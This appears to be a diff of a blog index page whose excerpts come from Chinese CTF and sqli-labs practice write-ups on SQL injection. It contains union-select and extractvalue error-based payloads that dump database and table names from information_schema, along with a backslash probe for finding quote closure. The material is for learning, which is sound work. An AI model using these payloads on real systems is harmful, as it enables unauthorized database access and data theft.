@@ -112,13 +112,9 @@
 
 4.爆库
 得到是ctf
-1-1&#x27; union select 1,2,database(),4#
-
-
-
 3.爆表名
 得到flag,users
-1-1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from informati ...</div><div class="read-more"><a class="more" href="/2025/07/20/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/07/07/sqli-labs/">sqli-labs</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-07-07T02:04:51.000Z">2025-07-07</time></div><div class="recent-post-content">前10关都是Get方式
+1-1&#x27; union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ct ...</div><div class="read-more"><a class="more" href="/2025/07/20/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/07/07/sqli-labs/">sqli-labs</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-07-07T02:04:51.000Z">2025-07-07</time></div><div class="recent-post-content">前10关都是Get方式
 Less-1 联合注入–单引号字符型注入1.我们可以使用\(转义字符)来判断SQL注入的闭合方式,判断注入类型。
 分析报错信息：看\斜杠后面跟着的字符，是什么字符，它的闭合字符就是什么，若是没有，就为数字型。
 12?id=1\#本题\后面是&#x27;
